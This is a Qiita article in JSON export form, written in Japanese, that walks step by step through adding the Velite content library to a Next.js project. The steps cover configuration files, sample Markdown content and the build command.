[{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:96\">Next.jsでMarkdown形式のコンテンツを扱いたく、Veliteを導入することにしました。<br>\n導入する際にいくつか詰まったため、備忘録として手順をまとめます。</p>\n<h1 data-sourcepos=\"5:1-5:8\">\n<span id=\"前提\" class=\"fragment\"></span><a href=\"#%E5%89%8D%E6%8F%90\"><i class=\"fa fa-link\"></i></a>前提</h1>\n<ul data-sourcepos=\"6:1-8:0\">\n<li data-sourcepos=\"6:1-6:81\">Next.jsプロジェクトを作成済（作成時のバージョン：15.5.2）</li>\n<li data-sourcepos=\"7:1-8:0\">Node.js環境構築済</li>\n</ul>\n<h1 data-sourcepos=\"9:1-9:14\">\n<span id=\"veliteとは\" class=\"fragment\"></span><a href=\"#velite%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>Veliteとは</h1>\n<p data-sourcepos=\"10:1-10:52\"><strong>公式ドキュメントより引用（和訳）</strong></p>\n<blockquote data-sourcepos=\"11:1-11:225\">\n<p data-sourcepos=\"11:2-11:225\">Veliteは型安全なデータレイヤーを構築するためのツールであり、Markdown/MDX、YAML、JSON、その他のファイルをZodスキーマを用いたアプリのデータレイヤーに変換します。</p>\n</blockquote>\n<p data-sourcepos=\"13:1-13:21\"><iframe id=\"qiita-embed-content__bb5fcb2b2a98a00e32b0cf79979c04d4\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__bb5fcb2b2a98a00e32b0cf79979c04d4\" data-content=\"https%3A%2F%2Fvelite.js.org\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"15:1-15:119\"><code>.md</code>や<code>.yml</code>形式などのファイルを型安全に取り扱えるようにするツールと理解しました。</p>\n<p data-sourcepos=\"17:1-17:149\">ドキュメントサイトの構築や、ブログ記事をMarkdown形式で管理したい場合に、型安全にコンテンツを扱えます。</p>\n<h1 data-sourcepos=\"19:1-19:14\">\n<span id=\"導入手順\" class=\"fragment\"></span><a href=\"#%E5%B0%8E%E5%85%A5%E6%89%8B%E9%A0%86\"><i class=\"fa fa-link\"></i></a>導入手順</h1>\n<p data-sourcepos=\"20:1-20:93\">公式ドキュメントのクイックスタートを参考に、導入していきます。</p>\n<p data-sourcepos=\"22:1-22:39\"><iframe id=\"qiita-embed-content__1f1e141fbd932efd16a9db3844d10a43\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1f1e141fbd932efd16a9db3844d10a43\" data-content=\"https%3A%2F%2Fvelite.js.org%2Fguide%2Fquick-start\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h2 data-sourcepos=\"24:1-24:38\">\n<span id=\"1ライブラリインストール\" class=\"fragment\"></span><a href=\"#1%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB\"><i class=\"fa fa-link\"></i></a>1.ライブラリインストール</h2>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"26:1-28:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span>npm <span class=\"nb\">install </span>velite <span class=\"nt\">-D</span>\n</code></pre></div></div>\n<h2 data-sourcepos=\"30:1-30:28\">\n<span id=\"2nextconfigtsの作成\" class=\"fragment\"></span><a href=\"#2nextconfigts%E3%81%AE%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>2.next.config.tsの作成</h2>\n<p data-sourcepos=\"31:1-31:66\">下記ページを元に定義ファイルを作成しました。</p>\n<p data-sourcepos=\"33:1-33:39\"><iframe id=\"qiita-embed-content__528e6f30ccd5d5d606e1cc3c6967f1e0\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__528e6f30ccd5d5d606e1cc3c6967f1e0\" data-content=\"https%3A%2F%2Fvelite.js.org%2Fguide%2Fwith-nextjs\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"35:1-35:82\">プロジェクト直下に<code>next.config.ts</code>を作成し、以下の定義を追加</p>\n<p data-sourcepos=\"37:1-37:116\">Next.jsで<code>npm run dev</code>や<code>npm run build</code>を実行したときにVeliteが起動されるように定義します。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"39:1-54:3\">\n<div class=\"code-lang\"><span class=\"bold\">next.config.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"kd\">type</span> <span class=\"p\">{</span> <span class=\"nx\">NextConfig</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">next</span><span class=\"dl\">'</span>\n\n<span class=\"kd\">const</span> <span class=\"nx\">isDev</span> <span class=\"o\">=</span> <span class=\"nx\">process</span><span class=\"p\">.</span><span class=\"nx\">argv</span><span class=\"p\">.</span><span class=\"nf\">indexOf</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">dev</span><span class=\"dl\">'</span><span class=\"p\">)</span> <span class=\"o\">!==</span> <span class=\"o\">-</span><span class=\"mi\">1</span>\n<span class=\"kd\">const</span> <span class=\"nx\">isBuild</span> <span class=\"o\">=</span> <span class=\"nx\">process</span><span class=\"p\">.</span><span class=\"nx\">argv</span><span class=\"p\">.</span><span class=\"nf\">indexOf</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">build</span><span class=\"dl\">'</span><span class=\"p\">)</span> <span class=\"o\">!==</span> <span class=\"o\">-</span><span class=\"mi\">1</span>\n<span class=\"k\">if </span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">process</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">VELITE_STARTED</span> <span class=\"o\">&amp;&amp;</span> <span class=\"p\">(</span><span class=\"nx\">isDev</span> <span class=\"o\">||</span> <span class=\"nx\">isBuild</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n  <span class=\"nx\">process</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">VELITE_STARTED</span> <span class=\"o\">=</span> <span class=\"dl\">'</span><span class=\"s1\">1</span><span class=\"dl\">'</span>\n  <span class=\"k\">import</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">velite</span><span class=\"dl\">'</span><span class=\"p\">).</span><span class=\"nf\">then</span><span class=\"p\">(</span><span class=\"nx\">m</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">m</span><span class=\"p\">.</span><span class=\"nf\">build</span><span class=\"p\">({</span> <span class=\"na\">watch</span><span class=\"p\">:</span> <span class=\"nx\">isDev</span><span class=\"p\">,</span> <span class=\"na\">clean</span><span class=\"p\">:</span> <span class=\"o\">!</span><span class=\"nx\">isDev</span> <span class=\"p\">}))</span>\n<span class=\"p\">}</span>\n\n<span class=\"kd\">const</span> <span class=\"nx\">nextConfig</span><span class=\"p\">:</span> <span class=\"nx\">NextConfig</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"cm\">/* config options here */</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">export</span> <span class=\"k\">default</span> <span class=\"nx\">nextConfig</span>\n</code></pre></div>\n</div>\n<h2 data-sourcepos=\"56:1-56:30\">\n<span id=\"3veliteconfigtsの作成\" class=\"fragment\"></span><a href=\"#3veliteconfigts%E3%81%AE%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>3.velite.config.tsの作成</h2>\n<p data-sourcepos=\"57:1-58:84\">プロジェクト直下にvelite.config.tsを作成します。<br>\nGitHubにサンプルがあるため、参照しつつ定義を追加しました。</p>\n<p data-sourcepos=\"60:1-60:72\"><iframe id=\"qiita-embed-content__59b84635bd8aafae91ca180263140567\" src=\"https://qiita.com/embed-contents/github-blob#qiita-embed-content__59b84635bd8aafae91ca180263140567\" data-content=\"https%3A%2F%2Fgithub.com%2Fzce%2Fvelite%2Fblob%2Fmain%2Fexamples%2Fnextjs%2Fvelite.config.ts\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\">\n</iframe>\n</p>\n<h2 data-sourcepos=\"62:1-62:54\">\n<span id=\"4contentフォルダ関連ファイルの作成\" class=\"fragment\"></span><a href=\"#4content%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E9%96%A2%E9%80%A3%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>4.contentフォルダ、関連ファイルの作成</h2>\n<h3 data-sourcepos=\"63:1-63:63\">\n<span id=\"1プロジェクト直下にcontentフォルダを作成\" class=\"fragment\"></span><a href=\"#1%E3%83%97%E3%83%AD%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E7%9B%B4%E4%B8%8B%E3%81%ABcontent%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E3%82%92%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>1.プロジェクト直下に<code>content</code>フォルダを作成</h3>\n<p data-sourcepos=\"64:1-64:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff610fac2-02e5-4952-b53b-f146cd929e96.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=051d5df345cc7490030cc39142e48fa1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff610fac2-02e5-4952-b53b-f146cd929e96.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=051d5df345cc7490030cc39142e48fa1\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff610fac2-02e5-4952-b53b-f146cd929e96.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=5ff66291d947b4b357f164596f2179a6 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f610fac2-02e5-4952-b53b-f146cd929e96.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"66:1-66:84\">\n<span id=\"2contentフォルダ配下に関連フォルダやファイルを作成する\" class=\"fragment\"></span><a href=\"#2content%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E9%85%8D%E4%B8%8B%E3%81%AB%E9%96%A2%E9%80%A3%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E3%82%84%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>2.<code>content</code>フォルダ配下に関連フォルダやファイルを作成する</h3>\n<p data-sourcepos=\"67:1-67:84\">Veliteが読み込むコンテンツを配置するフォルダを作成します。</p>\n<h4 data-sourcepos=\"69:1-69:86\">\n<span id=\"1contentフォルダ配下にpostsとothersとoptionsフォルダを作成\" class=\"fragment\"></span><a href=\"#1content%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E9%85%8D%E4%B8%8B%E3%81%ABposts%E3%81%A8others%E3%81%A8options%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E3%82%92%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>1.contentフォルダ配下に<code>posts</code>と<code>others</code>と<code>options</code>フォルダを作成</h4>\n<ul data-sourcepos=\"71:1-74:0\">\n<li data-sourcepos=\"71:1-71:45\">posts：Markdownファイルなどを配置</li>\n<li data-sourcepos=\"72:1-72:53\">others：その他のコンテンツファイル用</li>\n<li data-sourcepos=\"73:1-74:0\">options：サイト設定などのYAMLファイル用</li>\n</ul>\n<h4 data-sourcepos=\"75:1-75:58\">\n<span id=\"2posts配下にhello-worldmdファイルを作成\" class=\"fragment\"></span><a href=\"#2posts%E9%85%8D%E4%B8%8B%E3%81%ABhello-worldmd%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>2.posts配下に<code>hello-world.md</code>ファイルを作成</h4>\n<div class=\"code-frame\" data-lang=\"md\" data-sourcepos=\"77:1-92:3\">\n<div class=\"code-lang\"><span class=\"bold\">hello-world.md</span></div>\n<div class=\"highlight\"><pre><code><span class=\"nn\">---</span>\n<span class=\"na\">title</span><span class=\"pi\">:</span> <span class=\"s\">Hello world</span>\n<span class=\"na\">slug</span><span class=\"pi\">:</span> <span class=\"s\">hello-world</span>\n<span class=\"na\">date</span><span class=\"pi\">:</span> <span class=\"s\">1992-02-25 13:22</span>\n<span class=\"na\">cover</span><span class=\"pi\">:</span> <span class=\"s\">cover.jpg</span>\n<span class=\"na\">video</span><span class=\"pi\">:</span> <span class=\"s\">video.mp4</span>\n<span class=\"nn\">---</span>\n\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non risus. Suspendisse\n\n<span class=\"p\">![</span><span class=\"nv\">some image</span><span class=\"p\">](</span><span class=\"sx\">img.png</span><span class=\"p\">)</span>\n\n<span class=\"p\">[</span><span class=\"nv\">link to file</span><span class=\"p\">](</span><span class=\"sx\">plain.txt</span><span class=\"p\">)</span>\n\n</code></pre></div>\n</div>\n<p data-sourcepos=\"94:1-94:22\"><strong>以下より引用</strong></p>\n<p data-sourcepos=\"96:1-96:61\"><iframe id=\"qiita-embed-content__7e01f6f9c2359d3006a6864af69d4c0c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7e01f6f9c2359d3006a6864af69d4c0c\" data-content=\"https%3A%2F%2Fvelite.js.org%2Fguide%2Fquick-start%23create-contents-files\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h4 data-sourcepos=\"98:1-98:63\">\n<span id=\"3posts配下に関連ファイルをコピーして配置\" class=\"fragment\"></span><a href=\"#3posts%E9%85%8D%E4%B8%8B%E3%81%AB%E9%96%A2%E9%80%A3%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E3%82%B3%E3%83%94%E3%83%BC%E3%81%97%E3%81%A6%E9%85%8D%E7%BD%AE\"><i class=\"fa fa-link\"></i></a>3.posts配下に関連ファイルをコピーして配置</h4>\n<p data-sourcepos=\"100:1-100:51\">下記にファイルが用意されています。</p>\n<p data-sourcepos=\"102:1-102:92\"><iframe id=\"qiita-embed-content__1eb2640e40ba14fc23ebfe654a103d8b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1eb2640e40ba14fc23ebfe654a103d8b\" data-content=\"https%3A%2F%2Fgithub.com%2Fzce%2Fvelite%2Ftree%2Fmain%2Fexamples%2Fnextjs%2Fcontent%2Fposts%2F2024-05-08-hello-world\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h4 data-sourcepos=\"104:1-104:42\">\n<span id=\"4others配下にotherymlを作成\" class=\"fragment\"></span><a href=\"#4others%E9%85%8D%E4%B8%8B%E3%81%ABotheryml%E3%82%92%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>4.others配下に<code>other.yml</code>を作成</h4>\n<p data-sourcepos=\"106:1-106:39\">中身は何も書いていません。</p>\n<h4 data-sourcepos=\"108:1-108:43\">\n<span id=\"5options配下にindexymlを作成\" class=\"fragment\"></span><a href=\"#5options%E9%85%8D%E4%B8%8B%E3%81%ABindexyml%E3%82%92%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>5.options配下に<code>index.yml</code>を作成</h4>\n<p data-sourcepos=\"110:1-110:72\">GitHubのサンプルを参照しつつ、定義を追加しました。</p>\n<p data-sourcepos=\"112:1-112:81\"><iframe id=\"qiita-embed-content__decb806c161d5826cb5b375cb4c20af1\" src=\"https://qiita.com/embed-contents/github-blob#qiita-embed-content__decb806c161d5826cb5b375cb4c20af1\" data-content=\"https%3A%2F%2Fgithub.com%2Fzce%2Fvelite%2Fblob%2Fmain%2Fexamples%2Fnextjs%2Fcontent%2Foptions%2Findex.yml\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\">\n</iframe>\n</p>\n<h2 data-sourcepos=\"115:1-115:23\">\n<span id=\"5ビルドの実施\" class=\"fragment\"></span><a href=\"#5%E3%83%93%E3%83%AB%E3%83%89%E3%81%AE%E5%AE%9F%E6%96%BD\"><i class=\"fa fa-link\"></i></a>5.ビルドの実施</h2>\n<div class=\"code-frame\" data-lang=\"vim\" data-sourcepos=\"117:1-119:3\"><div class=\"highlight\"><pre><code>npx velite\n</code></pre></div></div>\n<p data-sourcepos=\"120:1-120:113\">コマンドを実行すると<code>.velite</code>フォルダとpublic配下に<code>static</code>フォルダが作成されます。</p>\n<p data-sourcepos=\"122:1-122:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fdd0a5533-1dfa-4e53-a8d6-7d6292557115.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e17bcf0242cbf85a6524abf6b5fee28e\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fdd0a5533-1dfa-4e53-a8d6-7d6292557115.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e17bcf0242cbf85a6524abf6b5fee28e\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fdd0a5533-1dfa-4e53-a8d6-7d6292557115.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=3747d64ad0a0b76daa00abacfcbde902 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/dd0a5533-1dfa-4e53-a8d6-7d6292557115.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"124:1-124:76\"><code>.velite</code>フォルダは.gitignoreに追加することを推奨します。</p>\n<h2 data-sourcepos=\"126:1-126:11\">\n<span id=\"6確認\" class=\"fragment\"></span><a href=\"#6%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>6.確認</h2>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"127:1-134:3\">\n<div class=\"code-lang\"><span class=\"bold\">page.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">posts</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../../.velite</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"k\">export</span> <span class=\"k\">default</span> <span class=\"k\">async</span> <span class=\"kd\">function</span> <span class=\"nf\">Home</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">posts</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"136:1-136:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fdfca1a7c-b760-48f1-8756-2f9680072dd7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=069fb59c6d7481bd2235af53e938536f\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fdfca1a7c-b760-48f1-8756-2f9680072dd7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=069fb59c6d7481bd2235af53e938536f\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fdfca1a7c-b760-48f1-8756-2f9680072dd7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=96f12a4ca4cb66568e73dea8e96d8b8f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/dfca1a7c-b760-48f1-8756-2f9680072dd7.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"139:1-139:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"140:1-141:234\">最初はContentlayerを導入しようとしました。現在は、資金難からメンテナンスされていないとのことでした。残念…<br>\nVeliteのドキュメントは、まだ鋭意作成中とのことでした。GitHubに豊富な例があり、ドキュメントと並行して参照しつつ導入できました。地味に嬉しいと感じた出来事でした。</p>\n<h1 data-sourcepos=\"144:1-144:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"145:1-145:39\"><iframe id=\"qiita-embed-content__94c24bdbd83ea4c52f51960a6eecfe0e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__94c24bdbd83ea4c52f51960a6eecfe0e\" data-content=\"https%3A%2F%2Fvelite.js.org%2Fguide%2Fquick-start\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"147:1-147:39\"><iframe id=\"qiita-embed-content__84c18d7f91f8b5a5f2933d4b58a8e794\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__84c18d7f91f8b5a5f2933d4b58a8e794\" data-content=\"https%3A%2F%2Fvelite.js.org%2Fguide%2Fwith-nextjs\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"149:1-149:55\"><iframe id=\"qiita-embed-content__7d89a8511eb2280d7983d0862fb60556\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7d89a8511eb2280d7983d0862fb60556\" data-content=\"https%3A%2F%2Fgithub.com%2Fzce%2Fvelite%2Ftree%2Fmain%2Fexamples%2Fnextjs\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"151:1-151:29\"><iframe id=\"qiita-embed-content__9f1dce6193b71ee2dc1f99365d9f6c9c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__9f1dce6193b71ee2dc1f99365d9f6c9c\" data-content=\"https%3A%2F%2Fcontentlayer.dev%2Fdocs\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"153:1-153:47\"><iframe id=\"qiita-embed-content__be89a24c914bd131b5fb953fd6faab38\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__be89a24c914bd131b5fb953fd6faab38\" data-content=\"https%3A%2F%2Fgithub.com%2Fcontentlayerdev%2Fcontentlayer\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nNext.jsでMarkdown形式のコンテンツを扱いたく、Veliteを導入することにしました。\n導入する際にいくつか詰まったため、備忘録として手順をまとめます。\n\n# 前提\n* Next.jsプロジェクトを作成済（作成時のバージョン：15.5.2）\n* Node.js環境構築済\n\n# Veliteとは\n**公式ドキュメントより引用（和訳）**\n>Veliteは型安全なデータレイヤーを構築するためのツールであり、Markdown/MDX、YAML、JSON、その他のファイルをZodスキーマを用いたアプリのデータレイヤーに変換します。\n\nhttps://velite.js.org\n\n`.md`や`.yml`形式などのファイルを型安全に取り扱えるようにするツールと理解しました。\n\nドキュメントサイトの構築や、ブログ記事をMarkdown形式で管理したい場合に、型安全にコンテンツを扱えます。\n\n# 導入手順\n公式ドキュメントのクイックスタートを参考に、導入していきます。\n\nhttps://velite.js.org/guide/quick-start\n\n## 1.ライブラリインストール\n\n```shell\n$ npm install velite -D\n```\n\n## 2.next.config.tsの作成\n下記ページを元に定義ファイルを作成しました。\n\nhttps://velite.js.org/guide/with-nextjs\n\nプロジェクト直下に`next.config.ts`を作成し、以下の定義を追加\n\nNext.jsで`npm run dev`や`npm run build`を実行したときにVeliteが起動されるように定義します。\n\n```ts:next.config.ts\nimport type { NextConfig } from 'next'\n\nconst isDev = process.argv.indexOf('dev') !== -1\nconst isBuild = process.argv.indexOf('build') !== -1\nif (!process.env.VELITE_STARTED && (isDev || isBuild)) {\n  process.env.VELITE_STARTED = '1'\n  import('velite').then(m => m.build({ watch: isDev, clean: !isDev }))\n}\n\nconst nextConfig: NextConfig = {\n  /* config options here */\n}\n\nexport default nextConfig\n```\n\n## 3.velite.config.tsの作成\nプロジェクト直下にvelite.config.tsを作成します。\nGitHubにサンプルがあるため、参照しつつ定義を追加しました。\n\nhttps://github.com/zce/velite/blob/main/examples/nextjs/velite.config.ts\n\n## 4.contentフォルダ、関連ファイルの作成\n### 1.プロジェクト直下に`content`フォルダを作成\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f610fac2-02e5-4952-b53b-f146cd929e96.png)\n\n### 2.`content`フォルダ配下に関連フォルダやファイルを作成する\nVeliteが読み込むコンテンツを配置するフォルダを作成します。\n\n#### 1.contentフォルダ配下に`posts`と`others`と`options`フォルダを作成\n\n* posts：Markdownファイルなどを配置\n* others：その他のコンテンツファイル用\n* options：サイト設定などのYAMLファイル用\n\n#### 2.posts配下に`hello-world.md`ファイルを作成\n\n```md:hello-world.md\n---\ntitle: Hello world\nslug: hello-world\ndate: 1992-02-25 13:22\ncover: cover.jpg\nvideo: video.mp4\n---\n\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non risus. Suspendisse\n\n![some image](img.png)\n\n[link to file](plain.txt)\n\n```\n\n**以下より引用**\n\nhttps://velite.js.org/guide/quick-start#create-contents-files\n\n#### 3.posts配下に関連ファイルをコピーして配置\n\n下記にファイルが用意されています。\n\nhttps://github.com/zce/velite/tree/main/examples/nextjs/content/posts/2024-05-08-hello-world\n\n#### 4.others配下に`other.yml`を作成\n\n中身は何も書いていません。\n\n#### 5.options配下に`index.yml`を作成\n\nGitHubのサンプルを参照しつつ、定義を追加しました。\n\nhttps://github.com/zce/velite/blob/main/examples/nextjs/content/options/index.yml\n\n\n## 5.ビルドの実施\n\n```vim\nnpx velite\n```\nコマンドを実行すると`.velite`フォルダとpublic配下に`static`フォルダが作成されます。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/dd0a5533-1dfa-4e53-a8d6-7d6292557115.png)\n\n`.velite`フォルダは.gitignoreに追加することを推奨します。\n\n## 6.確認\n```tsx:page.tsx\nimport { posts } from \"../../.velite\";\n\nexport default async function Home() {\n\n  console.log(posts);\n}\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/dfca1a7c-b760-48f1-8756-2f9680072dd7.png)\n\n\n# おわりに\n最初はContentlayerを導入しようとしました。現在は、資金難からメンテナンスされていないとのことでした。残念…\nVeliteのドキュメントは、まだ鋭意作成中とのことでした。GitHubに豊富な例があり、ドキュメントと並行して参照しつつ導入できました。地味に嬉しいと感じた出来事でした。\n\n\n# 参考\nhttps://velite.js.org/guide/quick-start\n\nhttps://velite.js.org/guide/with-nextjs\n\nhttps://github.com/zce/velite/tree/main/examples/nextjs\n\nhttps://contentlayer.dev/docs\n\nhttps://github.com/contentlayerdev/contentlayer\n","coediting":false,"comments_count":0,"created_at":"2025-09-13T13:03:05+09:00","group":null,"id":"4cb9b0a071d3ac40a109","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Next.js","versions":[]},{"name":"Velite","versions":[]}],"title":"【Next.js+Velite】VeliteでMarkdownコンテンツ管理を実現する","updated_at":"2025-09-13T13:03:05+09:00","url":"https://qiita.com/asa129/items/4cb9b0a071d3ac40a109","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":196,"team_membership":null,"organization_url_name":"jisou","slide":false},{"